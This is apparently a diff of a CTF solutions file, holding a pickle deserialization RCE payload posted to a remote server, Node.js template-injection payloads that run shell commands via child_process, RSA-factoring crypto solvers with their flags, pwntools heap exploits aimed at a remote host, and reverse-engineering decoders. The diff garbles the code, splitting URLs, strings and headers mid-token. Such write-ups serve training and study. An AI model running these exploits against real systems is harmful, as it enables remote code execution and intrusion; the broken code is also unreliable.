@@ -18,8 +18,8 @@ import requests
 import base64
 session = requests.session()
 a = b'cbuiltinsngetattrnp0n0cbuiltinsndictnp1n0g0n(g1nS'get'ntRp2n0cbuiltinsnglobalsn(tRp3n0g2n(g3nS'builtins'ntRp4n0g0n(g4nS'eval'ntRp5n0g5n(S'open("/tmp/res").read()'ntR.'
-#a = b'cbuiltinsngetattrnp0n0cbuiltinsndictnp1n0g0n(g1nS'get'ntRp2n0cbuiltinsnglobalsn(tRp3n0g2n(g3nS'builtins'ntRp4n0g0n(g4nS'eval'ntRp5n0g5n(S'open("/f1ag").read()'ntR.'
-#a = b"(ibuiltinsn__loader__np0n0cbuiltinsngetattrnp1n0g1n(g0nS'load_module'ntRp2n0g1n(g2n(S'os'ntRS'system'ntR(S'/flag.sh >/tmp/res'ntR."
+    #a = b'cbuiltinsngetattrnp0n0cbuiltinsndictnp1n0g0n(g1nS'get'ntRp2n0cbuiltinsnglobalsn(tRp3n0g2n(g3nS'builtins'ntRp4n0g0n(g4nS'eval'ntRp5n0g5n(S'open("/f1ag").read()'ntR.'
+    #a = b"(ibuiltinsn__loader__np0n0cbuiltinsngetattrnp1n0g1n(g0nS'load_module'ntRp2n0g1n(g2n(S'os'ntRS'system'ntR(S'/flag.sh >/tmp/res'ntR."
 try:
  #   pickle.loads(a)
     pass
@@ -27,29 +27,19 @@ except Exception as e:
     print(e)
 info = base64.b64encode(a)
 
-burp0_url = "http://123.127.164.29:22547/deserialize"
+burp0_url = "http://123.127.164.29:
+22547/deserialize"
 burp0_cookies = {"session": "eyJsb2dnZWRfaW4iOnRydWV9.ZEnLXA.Ovfb2CjwDPkteh5YnY6KoedxfqI"}
-burp0_headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:102.0) Gecko/20100101 Firefox/102.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/jxl,image/webp,*/*;q=0.8", "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded", "Origin": "http://123.127.164.29:22547", "Connection": "close", "Referer": "http://123.127.164.29:22547/deserialize", "Upgrade-Insecure-Requests": "1"}
+burp0_headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:
+102.0) Gecko/20100101 Firefox/102.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/jxl,image/webp,*/*;q=0.8", "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded", "Origin": "http://123.127.164.29:
+22547", "Connection": "close", "Referer": "http://123.127.164.29:
+22547/deserialize", "Upgrade-Insecure-Requests": "1"}
 burp0_data = {"payload": info, "token": "super_secret_key"}
-r = session.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data,proxies={'http':'http://127.0.0.1:8080'})
+r = session.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data,proxies={'http':'http://127.0.0.1:
+8080'})
 print(r.text)
-```
-
-
-
-```
 name=%7B%7Brange.constructor%28%22return+global.process.mainModule.require%28%27child_process%27%29.execSync%28%27ls+%2F%27%29%22%29%28%29%7D%7D
-```
-
-
-
-```
 name=%7B%7Brange.constructor%28%22return+global.process.mainModule.require%28%27child_process%27%29.execSync%28%27%2Fflag%27%29%22%29%28%29%7D%7D
-```
-
-
-
-```
 from hashlib import md5
 import sympy
 info = 8624427976171269462118041236131860880353185724611115567769031391985212205334299206262416050893790496280487822633821896510164798860649610314643858720250778483148210218901983626065047187632632798657803619845039340275071550929875181405670087477995477977547400586054837874496784983655506143028794707073522709491957889389497112122398129617977201085938125308438851338856122300458905698778054527484342442183812543835926984418962888390266572594876953921925983459356710496966798344822306906157437194702449649080264101152002664874120624149638832121202508620869036457251193215517734116478672807574868697528296087842179376581201
@@ -59,17 +49,20 @@ k=(e*info-1)//n
 add=(e*info-1-k*n-k)//(e-k)
 p,q=sympy.symbols("p,q")
 print(sympy.solve([p+q-add,p*q-n],[p,q]))
-p=106483254093105396039548174726517676927718852255096190752296132034899523032039581518836610008572324412615776119186371272360118108406189595101288328995218056963616651362138339776971321873002194792155786835067874836245906489151235922037343849785069999238345058949556720572496281158100262337967552990286658700181
-q=137545133113669314627231528973865490961598984443653051281715462279050673842207467884506102766855502137212910483535434830748841956672570579115175710704203320134964349093554219268780150275798268948595283930957416946424691660372539013825771205252824973766151324189104355113758651391981233324078514005527864881627
+p=10648325409310539603954817472651767692771885225509619075229613203489952303
+2039581518836610008572324412615776119186371272360118108406189595101288328995
+2180569636166513621383397769713218730021947921557868350678748362459064891512
+3592203734384978506999923834505894955672057249628115810026233796755299028665
+8700181
+q=13754513311366931462723152897386549096159898444365305128171546227905067384
+2207467884506102766855502137212910483535434830748841956672570579115175710704
+2033201349643490935542192687801502757982689485952839309574169464246916603725
+3901382577120525282497376615132418910435511375865139198123332407851400552786
+4881627
 flag = "flag{%s}"%(md5(str(p).encode()+str(q).encode()).hexdigest())
 print(flag)
 print("flag_md5 = %s"%md5(flag.encode()).hexdigest())
-#flag{6c4d43632130e80aecb991c178ad6bd2}
-```
-
-
-
-```
+    #flag{6c4d43632130e80aecb991c178ad6bd2}
 from Crypto.Util.number import *
 import gmpy2
 from hashlib import md5
@@ -94,14 +87,10 @@ flag = "flag{%s}"%md5(str(p+q+r).encode()).hexdigest()
 flag_md5 = md5(str(flag).encode()).hexdigest()
 print(flag)
 print(flag_md5)
-#flag{e2aab18eab877479ff9fd357a109f37e}
-```
-
-
-
-```
+    #flag{e2aab18eab877479ff9fd357a109f37e}
 #/usr/bin/env python
-#-*-coding:utf-8-*-
+#-*-coding:
+utf-8-*-
 
 from pwn import *
 import time
@@ -136,16 +125,12 @@ def pwn(ip,port,debug):
 
 if __name__ =="__main__":
  pwn("123.127.164.29",22424,0)
-```
-
-
-
-```
 #/usr/bin/env python
-#-*-coding:utf-8-*-
+#-*-coding:
+utf-8-*-
 from pwn import *
 context(os='linux',arch='amd64', log_level='debug')
-#libc=ELF('./libc.so.6')
+    #libc=ELF('./libc.so.6')
 proc="./inuse"
 libc=ELF('./libc-2.31.so')
 elf=ELF(proc)
@@ -244,13 +229,9 @@ constraints:
   [rdx] == NULL || rdx == NULL
 
 """
-```
-
-
-
-```
 #/usr/bin/env python
-#-*-coding:utf-8-*-
+#-*-coding:
+utf-8-*-
 
 from pwn import *
 
@@ -321,10 +302,10 @@ if __name__ =="__main__":
 
 """
 x/20gx $rebase(0x000202060)
-0x565222b1b060 <pindex>: 0x0000000000000000 0x0000565223a1f260
-0x565222b1b070 <pindex+16>: 0x0000565223a1f280 0x0000565223a1f2a0
-0x565222b1b080 <pindex+32>: 0x0000565223a1f2c0 0x0000565223a1f2e0
-0x565222b1b090 <pindex+48>: 0x0000565223a1f300 0x0000000000000000
+0x565222b1b060 : 0x0000000000000000 0x0000565223a1f260
+0x565222b1b070 : 0x0000565223a1f280 0x0000565223a1f2a0
+0x565222b1b080 : 0x0000565223a1f2c0 0x0000565223a1f2e0
+0x565222b1b090 : 0x0000565223a1f300 0x0000000000000000
 local and remote
 0x4f2a5 execve("/bin/sh", rsp+0x40, environ)
 constraints:
@@ -340,11 +321,6 @@ constraints:
   [rsp+0x70] == NULL
 
 """
-```
-
-
-
-```
 def sub_401040(a1, a2):
     if a1 == a2:
         return 0
@@ -373,11 +349,6 @@ for i in range(23):
         if sub_401040(j,0xD3) == dec[i]:
             print(chr(j),end='')
             break
-```
-
-
-
-```
 __int64 __fastcall sub_400686(unsigned int *a1, __int64 a2)
 {
   __int64 result; // rax
@@ -411,33 +382,18 @@ __int64 __fastcall sub_400686(unsigned int *a1, __int64 a2)
   a1[1] = v1;
   return result;
 }
-```
-
-
-
-```
 s2[0] = 0xACA2A420;
   s2[1] = 0xF835FCA4;
   s2[2] = 0xAC0D6E57;
   s2[3] = 0x5499EBAE;
   s2[4] = 0x26F39D3A;
   s2[5] = 0xE478EBF8;
-```
-
-
-
-```
 v5[0] = 0xDEADBEEF;
   v5[1] = 0x87654321;
   v5[2] = 0xABCDEF01;
   v5[3] = 0x23456789;
-```
-
-
-
-```
-#include <stdio.h>
-#include <stdint.h>
+    #include <stdio.h>
+    #include <stdint.h>
 
 int main()
 {
